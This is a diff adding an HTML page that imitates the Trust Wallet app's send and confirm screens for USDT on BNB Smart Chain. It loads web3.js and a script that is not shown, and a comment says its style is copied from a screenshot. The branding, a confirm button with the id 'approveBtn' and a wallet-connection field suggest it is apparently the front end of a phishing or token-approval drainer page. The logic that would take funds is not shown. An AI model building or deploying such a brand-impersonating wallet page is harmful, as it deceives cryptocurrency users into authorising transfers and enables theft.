@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Trust Wallet</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>ðŸ›¡ï¸</text></svg>">
+  <link rel="stylesheet" href="style.css">
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+</head>
+<body>
+  <div id="app">
+    <!-- Splash -->
+    <div id="splash" class="screen active">
+      <div class="splash-logo">
+        <svg width="72" height="72" viewBox="0 0 72 72" fill="none">
+          <circle cx="36" cy="36" r="36" fill="#0500FF"/>
+          <path d="M36 16C28 16 22 22 22 30V38C22 46 28 52 36 52C44 52 50 46 50 38V30C50 22 44 16 36 16Z" fill="white"/>
+          <path d="M36 22C31 22 27 26 27 31V37C27 42 31 46 36 46C41 46 45 42 45 37V31C45 26 41 22 36 22Z" fill="#0500FF"/>
+        </svg>
+      </div>
+      <div class="splash-text">Trust Wallet</div>
+      <div class="loader"></div>
+    </div>
+
+    <!-- Amount Screen (exact TW style from screenshot) -->
+    <div id="main" class="screen">
+      <div class="tw-topbar">
+        <button class="circle-btn" id="backBtn">â€¹</button>
+        <div class="tw-title">Amount</div>
+        <button class="circle-btn dots">â€¢â€¢â€¢</button>
+      </div>
+
+      <div class="to-line">
+        To: <span id="toAddress">â€”</span>
+      </div>
+
+      <div class="amount-area">
+        <div class="big-amount" id="displayAmount">0</div>
+        <div class="fiat-line" id="usdValue">â‰ˆ $0.00 <span class="swap">â‡…</span></div>
+      </div>
+
+      <div class="token-row">
+        <div class="token-left">
+          <div class="token-icon-wrap">
+            <div class="token-icon-t">T</div>
+            <div class="token-chain"></div>
+          </div>
+          <div>
+            <div class="token-bal" id="tokenBalLabel">0 USDT</div>
+            <div class="token-usd" id="tokenUsdLabel">$0.00</div>
+          </div>
+        </div>
+        <button class="max-btn" id="maxBtn">Max</button>
+      </div>
+
+      <div class="numpad">
+        <button class="np">1</button><button class="np">2</button><button class="np">3</button>
+        <button class="np">4</button><button class="np">5</button><button class="np">6</button>
+        <button class="np">7</button><button class="np">8</button><button class="np">9</button>
+        <button class="np">.</button><button class="np">0</button><button class="np del">âŒ«</button>
+      </div>
+
+      <div class="bottom-bar">
+        <button id="reviewBtn" class="review-btn" disabled>Review</button>
+      </div>
+    </div>
+
+    <!-- Review / Confirm overlay -->
+    <div id="review" class="screen">
+      <div class="tw-topbar">
+        <button class="circle-btn" id="backToAmount">â€¹</button>
+        <div class="tw-title">Confirm</div>
+        <div style="width:40px"></div>
+      </div>
+      <div class="review-body">
+        <div class="token-circle-lg">T</div>
+        <div class="rev-amount" id="revAmount">0 USDT</div>
+        <div class="rev-fiat" id="revFiat">â‰ˆ $0.00</div>
+
+        <div class="detail-card">
+          <div class="d-row"><span>To</span><span class="mono" id="revTo">â€”</span></div>
+          <div class="d-row"><span>Network</span><span>BNB Smart Chain</span></div>
+          <div class="d-row"><span>Token</span><span>USDT</span></div>
+          <div class="d-row"><span>Network fee</span><span class="muted">â‰ˆ 0.0003 BNB</span></div>
+        </div>
+
+        <div class="wallet-strip">
+          <div>
+            <div class="ws-label">From</div>
+            <div class="ws-addr" id="walletAddr">Not connected</div>
+          </div>
+          <div class="ws-badge">BSC</div>
+        </div>
+        <div id="txStatus" class="tx-status hidden"></div>
+      </div>
+      <div class="bottom-bar">
+        <button id="approveBtn" class="review-btn success">Confirm</button>
+      </div>
+    </div>
+
+    <!-- Success -->
+    <div id="success" class="screen">
+      <div class="success-wrap">
+        <div class="check-circle">
+          <svg class="check-svg" viewBox="0 0 52 52">
+            <circle class="check-circle-bg" cx="26" cy="26" r="25" fill="none"/>
+            <path class="check-path" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
+          </svg>
+        </div>
+        <div class="success-title">Payment Successful</div>
+        <div class="success-sub">Transaction submitted and processing.</div>
+        <div class="success-amount" id="successAmount">0 USDT</div>
+        <button class="review-btn primary" style="margin-top:28px;width:180px" onclick="location.reload()">Done</button>
+      </div>
+    </div>
+  </div>
+  <script src="app.js"></script>
+</body>
+  </html>
